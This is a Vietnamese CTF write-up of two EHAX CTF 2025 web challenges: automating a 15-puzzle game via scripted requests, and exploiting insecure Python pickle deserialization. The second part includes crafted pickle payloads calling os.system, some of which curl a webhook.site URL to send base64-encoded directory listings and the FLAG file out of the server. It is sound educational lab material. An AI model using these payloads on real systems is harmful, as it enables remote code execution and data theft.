---
title: "EHAX CTF 2025"
description: "EHAX CTF 2025"
summary: "EHAX CTF 2025 writeup"
categories: ["Writeup"]
tags: ["Web"]
#externalUrl: ""
date: 2025-02-17
draft: false
cover: ../../post/ehaxctf2025/feature.png

authors:
  - winky
---



Cuối tuần trước mình có chơi EHAX CTF với team laevatain và mình giải được 2 bài web (2 bài còn lại khó với lag quá nên mình thua 😔)

![image](https://hackmd.io/_uploads/S1m-TYkqyx.png)



## 15_puzzle

![image](https://hackmd.io/_uploads/H1Xvy71qkl.png)

### Hints

Brute force

### Solution

Challenge cho mình một trang web như sau 

![image](https://hackmd.io/_uploads/rkrmxX15ke.png)

Thì web này chỉ có một trò chơi 15 puzzle thôi, mình có thử scan các kiểu cũng không có gì sú nên đành chơi vậy. 

![image](https://hackmd.io/_uploads/rJJNx7ycJg.png)

Sau khi chơi xong một level thì mình nhận được 1 request sau.

![image](https://hackmd.io/_uploads/HJ_-QNyqkg.png)

 Có thể thấy web sẽ đưa cho ta một level tiếp theo và bắt mình giải tiếp. 

![image](https://hackmd.io/_uploads/Hy5GQVy51x.png)

Tới đây thì mình thấy cứ giải tay thì không ổn vì có khả năng là 100 hoặc 1000 level lận nên mình tìm cách giải các puzzle này thật nhanh. Sau một hồi lục các tool giải puzzle trên mạng thì mình tìm được một cái khá ngon và mới update gần đây hehe : https://github.com/Bryce-Leung/15-Puzzle-Solver

Ok thì từ đó mình xây dụng solve script theo các bước sau : 

* Lấy puzzle của level hiện tại: Mình có thể sử dụng python để thực hiện request lên level mình cần làm. Để ý rằng sẽ có một line chứa cái grid của các số nên mình sẽ tìm line đó và format nó đi. 

```python
import requests
import os
import re
url = 'http://chall.ehax.tech:8001/p/'+"d7b51dadf6594b0e8e0737a88ea176fd"

response = requests.get(url)
response_lines = response.text.split("\n")
for i in response_lines:
    if ("let puzzle" in i):
        line = i
        line = re.sub(r"\[|\]|,|;|let puzzle =", "", line).split()
        print(line)
```

Sau khi format thì mình được một mảng như sau : Ở đây 4 số đầu tiên là 4 số ở hàng 1 và cứ tiếp tục vậy, ...

![image](https://hackmd.io/_uploads/Hy7YdV1qkg.png)

* Tiếp theo, từ cái grid mình lấy ở trên mình sẽ ghi vào một file pattern.txt sao cho đúng với format của tool mà mình sử dụng: https://github.com/Bryce-Leung/15-Puzzle-Solver/blob/main/boards/board11.txt

```python
import requests
import os
import re
url = 'http://chall.ehax.tech:8001/p/'+"d7b51dadf6594b0e8e0737a88ea176fd"

response = requests.get(url)
response_lines = response.text.split("\n")
for i in response_lines:
    if ("let puzzle" in i):
        line = i
        line = re.sub(r"\[|\]|,|;|let puzzle =", "", line).split()
        print(line)
        with open("pattern.txt", "w") as f:
            f.write("4\n")
            for i in range(4):
                for j in range(4):
                    ch = str(line[i*4+j])
                    if (len(ch) == 1):
                        if (ch == "0"):
                            f.write("   ")
                        else:
                            f.write(" "+ch+" ")
                    else:
                        f.write(str(line[i*4+j]) + " ")
                f.write("\n")
```

Sau khi chạy thì ta có được một file pattern như sau. Để ý rằng số có 1 chữ số thì mình sẽ thêm một padding vào để length = 2 và số 0 sẽ để trống. 

![image](https://hackmd.io/_uploads/HJApuNJ5kl.png)

* Tiếp theo, mình sẽ khởi chạy tool bằng lệnh java đã được ghi trong hướng dẫn

```python
import requests
import os
import re
url = 'http://chall.ehax.tech:8001/p/'+"d7b51dadf6594b0e8e0737a88ea176fd"

response = requests.get(url)
response_lines = response.text.split("\n")
for i in response_lines:
    if ("let puzzle" in i):
        line = i
        line = re.sub(r"\[|\]|,|;|let puzzle =", "", line).split()
        print(line)
        with open("pattern.txt", "w") as f:
            f.write("4\n")
            for i in range(4):
                for j in range(4):
                    ch = str(line[i*4+j])
                    if (len(ch) == 1):
                        if (ch == "0"):
                            f.write("   ")
                        else:
                            f.write(" "+ch+" ")
                    else:
                        f.write(str(line[i*4+j]) + " ")
                f.write("\n")
        os.system("java fifteenpuzzle.Solver pattern.txt sol.txt")
```

Khi chạy xong thì mình có được một file solve.txt có nội dung như sau: 

![image](https://hackmd.io/_uploads/BkpYFNkqkx.png)

Ok ngon, lúc này thì mình sẽ tiến hành format solve.txt trên. Để ý rằng mỗi move sẽ được lưu trong movements của data và có dạng như sau

![image](https://hackmd.io/_uploads/rkqTtVyqJe.png)

* Sau khi test 4 hướng đi của bảng thì mình sẽ xây dựng được một hàm format như sau để biến LRDU thành tọa độ.

```python
import requests
import os
import re
url = 'http://chall.ehax.tech:8001/p/'+"d7b51dadf6594b0e8e0737a88ea176fd"

response = requests.get(url)
response_lines = response.text.split("\n")
for i in response_lines:
    if ("let puzzle" in i):
        line = i
        line = re.sub(r"\[|\]|,|;|let puzzle =", "", line).split()
        print(line)
        with open("pattern.txt", "w") as f:
            f.write("4\n")
            for i in range(4):
                for j in range(4):
                    ch = str(line[i*4+j])
                    if (len(ch) == 1):
                        if (ch == "0"):
                            f.write("   ")
                        else:
                            f.write(" "+ch+" ")
                    else:
                        f.write(str(line[i*4+j]) + " ")
                f.write("\n")
        os.system("java fifteenpuzzle.Solver pattern.txt solve.txt")

        json_data = {
            'movements': [
                
            ],
        }

        with open("solve.txt") as f:
            a = f.readlines()
            for i in a:
                i = i.split()[1]
                if (i == "L"):
                    json_data['movements'].append([0,1])
                elif (i == "R"):
                    json_data['movements'].append([0,-1])
                elif (i == "U"):
                    json_data['movements'].append([1,0])
                else:
                    json_data['movements'].append([-1,0])
```

* Ok lúc này ta đã có json_data rồi thì post lên để check thôi 

```python 
import requests
import os
import re
url = 'http://chall.ehax.tech:8001/p/'+"d7b51dadf6594b0e8e0737a88ea176fd"

response = requests.get(url)
response_lines = response.text.split("\n")
for i in response_lines:
    if ("let puzzle" in i):
        line = i
        line = re.sub(r"\[|\]|,|;|let puzzle =", "", line).split()
        print(line)
        with open("pattern.txt", "w") as f:
            f.write("4\n")
            for i in range(4):
                for j in range(4):
                    ch = str(line[i*4+j])
                    if (len(ch) == 1):
                        if (ch == "0"):
                            f.write("   ")
                        else:
                            f.write(" "+ch+" ")
                    else:
                        f.write(str(line[i*4+j]) + " ")
                f.write("\n")
        os.system("java fifteenpuzzle.Solver pattern.txt solve.txt")

        json_data = {
            'movements': [
                
            ],
        }

        with open("solve.txt") as f:
            a = f.readlines()
            for i in a:
                i = i.split()[1]
                if (i == "L"):
                    json_data['movements'].append([0,1])
                elif (i == "R"):
                    json_data['movements'].append([0,-1])
                elif (i == "U"):
                    json_data['movements'].append([1,0])
                else:
                    json_data['movements'].append([-1,0])

        check_url = url + "/check"
        response = requests.post(
            check_url,
            headers={"Content-Type": "application/json"},
            json=json_data,
            verify=False,
        )
        print(response.text)
```

Sau khi chạy thì mình nhận được response trùng với khi nãy nên mình nghĩ tool này đã chạy đúng rồi.

![image](https://hackmd.io/_uploads/SJM8cVycJe.png)

* Tiếp theo mình sẽ tiến hành format lại response để chỉ trả ra cái id của puzzle 

```python
import requests
import os
import re
url = 'http://chall.ehax.tech:8001/p/'+"d7b51dadf6594b0e8e0737a88ea176fd"

response = requests.get(url)
response_lines = response.text.split("\n")
for i in response_lines:
    if ("let puzzle" in i):
        line = i
        line = re.sub(r"\[|\]|,|;|let puzzle =", "", line).split()
        print(line)
        with open("pattern.txt", "w") as f:
            f.write("4\n")
            for i in range(4):
                for j in range(4):
                    ch = str(line[i*4+j])
                    if (len(ch) == 1):
                        if (ch == "0"):
                            f.write("   ")
                        else:
                            f.write(" "+ch+" ")
                    else:
                        f.write(str(line[i*4+j]) + " ")
                f.write("\n")
        os.system("java fifteenpuzzle.Solver pattern.txt solve.txt")

        json_data = {
            'movements': [
                
            ],
        }

        with open("solve.txt") as f:
            a = f.readlines()
            for i in a:
                i = i.split()[1]
                if (i == "L"):
                    json_data['movements'].append([0,1])
                elif (i == "R"):
                    json_data['movements'].append([0,-1])
                elif (i == "U"):
                    json_data['movements'].append([1,0])
                else:
                    json_data['movements'].append([-1,0])

        check_url = url + "/check"
        response = requests.post(
            check_url,
            headers={"Content-Type": "application/json"},
            json=json_data,
            verify=False,
        )
        next_url = re.sub(r'{"next_puzzle":"/p/|","solved":true}', "", response.text)
        print(next_url)
```

Sau khi chạy thì mình có kết quả như sau 

![image](https://hackmd.io/_uploads/SyZxjNy9ye.png)

Ok khá ngon rồi bây giờ chỉ cần xây dụng một cái loop để brute force là xong. Mình có thể xây dựng một file loop.py như sau để gọi file solve và thay đổi id khi giải được puzzle trước. 

```python
import os
import subprocess

cmd = ["python3", "solve.py", "d7b51dadf6594b0e8e0737a88ea176fd"]
for i in range(1000):
    next_url = (subprocess.check_output(cmd).decode().split("\n")[4])
    print(next_url)
    cmd = ["python3", "solve.py", next_url]
```

Và file solve.py final 

```python
import requests
import os
import re
import sys
id = sys.argv[1]
url = 'http://chall.ehax.tech:8001/p/'+id

response = requests.get(url)
response_lines = response.text.split("\n")
for i in response_lines:
    if ("let puzzle" in i):
        line = i
        line = re.sub(r"\[|\]|,|;|let puzzle =", "", line).split()
        with open("pattern.txt", "w") as f:
            f.write("4\n")
            for i in range(4):
                for j in range(4):
                    ch = str(line[i*4+j])
                    if (len(ch) == 1):
                        if (ch == "0"):
                            f.write("   ")
                        else:
                            f.write(" "+ch+" ")
                    else:
                        f.write(str(line[i*4+j]) + " ")
                f.write("\n")
        os.system("java fifteenpuzzle.Solver pattern.txt solve.txt")

        json_data = {
            'movements': [
                
            ],
        }

        with open("solve.txt") as f:
            a = f.readlines()
            for i in a:
                i = i.split()[1]
                if (i == "L"):
                    json_data['movements'].append([0,1])
                elif (i == "R"):
                    json_data['movements'].append([0,-1])
                elif (i == "U"):
                    json_data['movements'].append([1,0])
                else:
                    json_data['movements'].append([-1,0])

        check_url = url + "/check"
        response = requests.post(
            check_url,
            headers={"Content-Type": "application/json"},
            json=json_data,
            verify=False,
        )
        next_url = re.sub(r'{"next_puzzle":"/p/|","solved":true}', "", response.text)
        print(next_url)
```

Tiến hành chạy file loop và sau 100 cái puzzle thì mình nhận được một puzzle với id khá lạ 

![image](https://hackmd.io/_uploads/SJeg34Jq1l.png)

![image](https://hackmd.io/_uploads/BkDrhVJ5ye.png)

Vào thử endpoint /fl4g_i5_you_c4n7_s33_m3 và mình thấy có một nút như sau

![image](https://hackmd.io/_uploads/SyFL3Ekq1e.png)

Ok sau khi bấm nút thì trả cho mình một cái hình. Lúc này khá troll vì mình tìm đủ mọi cách mà không ra flag đến nỗi forensic luôn cả tấm hình :))

![image](https://hackmd.io/_uploads/rk-D2Ekcye.png)

Nhưng không flag nằm ở header của /fl4g_i5_you_c4n7_s33_m3. Ảo thật đấy

![image](https://hackmd.io/_uploads/r1v_nVyqkl.png)

Decode base64 header Hmm trên và mình có flag

![image](https://hackmd.io/_uploads/r16FnNJ9Jg.png)

`Flag: EH4X{h499y_u_s0lv3d_15_9uzz13_100_7im35}`

## Serialize

![image](https://hackmd.io/_uploads/HJIJkmJ91e.png)

### Hints

Insecure deserialization

### Solution

Challenge cho mình một trang web sau

![image](https://hackmd.io/_uploads/ByHrZ7k5Jg.png)

Ok mò devtool thì mình ăn ngay một đống JSFuck 

![image](https://hackmd.io/_uploads/Sk9Lbmyqkl.png)

Hên là mình có lưu tool để decode hehe: https://enkhee-osiris.github.io/Decoder-JSFuck/

![image](https://hackmd.io/_uploads/By3nWQ15kg.png)

Ok sau khi decode thì mình thấy 2 từ khá sú là dreky và ohyeahboiiiahhuhh vì nó không liên quan đến JS. Lúc này thì mình chắc chắn đó là username và password mà ta cần tìm. 

![image](https://hackmd.io/_uploads/H1nJfXJqkl.png)

Đăng nhập vào thì mình lại tiếp tục bị troll bởi một tấm hình. Tìm đủ mọi cách vẫn không có gì khả nghi cho đến khi đọc Burpsuite và thấy một endpoint khá lạ. 

![image](https://hackmd.io/_uploads/SyO26Bgcyg.png)

Vào endpoint trên và mình có được part đầu của flag

![image](https://hackmd.io/_uploads/HJke471cyx.png)

Bật devtool thì mình có luôn part 2

![image](https://hackmd.io/_uploads/rJ2eEQy91x.png)

Không lẽ bài này là scavenger hunt ??? Nhưng tên chall là serialize mà nên mình tiếp tục tìm file stylesheet và lại thấy có một endpoint lạ : /t0p_s3cr3t_p4g3_7_7

![image](https://hackmd.io/_uploads/ryvGV719ke.png)

Vào thử thì cũng không có gì khả nghi

![image](https://hackmd.io/_uploads/Sy_XNmJqyg.png)

Cho đến khi check Burpsuite thì mình phát hiện có một header lạ đã được base64 lại : gASVIAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAVkcmVreZSFlFKULg==

![image](https://hackmd.io/_uploads/ByhS47yqJx.png)

Tiến hành decode thì mình nhận ra luôn đây là pickle serialize của python 

![image](https://hackmd.io/_uploads/Hk2fHmJ9Jx.png)

Payload của X-Serial-Token: b'\x80\x04\x95\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x05dreky\x94\x85\x94R\x94.'

Sau khi tìm hiểu thì mình biết là nó sẽ gọi hàm dreky nên mình thử dump và nhận được một cái pickle gần giống vậy : b'\x80\x04\x95\x1f\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x04ls /\x94\x85\x94\x86\x94.'

![image](https://hackmd.io/_uploads/BkVLS719ke.png)

Ok thì lúc này chỉ cần craft payload thôi, ta có thể dễ dàng tìm trong blog này : https://adrianstoll.com/post/python-in-a-pickle-an-explanation-of-the-python-pickle-format-and-security-problems/ . Ta có thể xây dựng một pickle như sau "cos\nsystem\nS'/bin/bash'\n\x85R." để thực thi lệnh /bin/bash khi load 

![image](https://hackmd.io/_uploads/BJD9HQy5kx.png)

Ok thì mình sẽ tiến hành xây dựng một pickle để thực hiện lệnh ls như sau 


```python
import base64 
import pickle
import os

payload = b"cos\nsystem\nS'ls'\n\x85R."
print(pickle.loads(payload))
print(base64.b64encode(payload))
```

Có thể thấy lệnh sẽ chạy sau khi load và mình có thể xem được các file trong thư mục hiện tại

![image](https://hackmd.io/_uploads/SyQmV8xckl.png)

Có một vấn đề là khi submit payload thì web trả ra process id của lệnh chứ không phải output nên mình nghĩ đến reverse shell hoặc wget webhook 

![image](https://hackmd.io/_uploads/ryW387191l.png)

Lúc này mình xây dựng payload để wget webhook và thực hiện lệnh ls để list các thư mục hiện tại

```python
import base64 
import pickle
import os

payload = b"cos\nsystem\nS'FLAG=$(curl https://webhook.site/642fc66c-f78b-40b5-9795-648e101b262d/?c=`ls`'\n\x85R."
print(pickle.loads(payload))
print(base64.b64encode(payload))
```

Sau đó mình cacth được một cái request nhưng chỉ có file app.py. 

![image](https://hackmd.io/_uploads/rJxUwQ1c1e.png)

Sau một hồi debug thì mình nhìn ra vấn đề có liên quan đến kí tự newline nên mình chơi encode base64 luôn

```python
import base64 
import pickle
import os

payload = b"cos\nsystem\nS'FLAG=$(curl https://webhook.site/642fc66c-f78b-40b5-9795-648e101b262d/?c=`ls | base64`)'\n\x85R."
print(pickle.loads(payload))
print(base64.b64encode(payload))
```

Ok lần này thì mình đã list ra được tất cả file trong thư mục 

![image](https://hackmd.io/_uploads/ByQAvQyc1g.png)

![image](https://hackmd.io/_uploads/HkKyOm19ke.png)

Thử trên challenge thì mình list được thư mục của server luôn and yeah có một file FLAG kìa

![image](https://hackmd.io/_uploads/Hk6buXycyx.png)

![image](https://hackmd.io/_uploads/BJamdmy9yx.png)

Tới đây thì mình chỉ cần đọc file FLAG đó là xong 

```python
import base64 
import pickle
import os

payload = b"cos\nsystem\nS'FLAG=$(curl https://webhook.site/642fc66c-f78b-40b5-9795-648e101b262d/?c=`cat FLAG | base64`)'\n\x85R."
print(pickle.loads(payload))
print(base64.b64encode(payload))
```

Sau khi chạy trên thì mình lấy được flag bằng lệnh cat

![image](https://hackmd.io/_uploads/B1lPdmk51x.png)

![image](https://hackmd.io/_uploads/B1O_uXy9Jg.png)

`Flag: E4HX{oh_h3l1_n44www_y0u_8r0k3_5th_w4l1}`

## Route (53)²

Updating...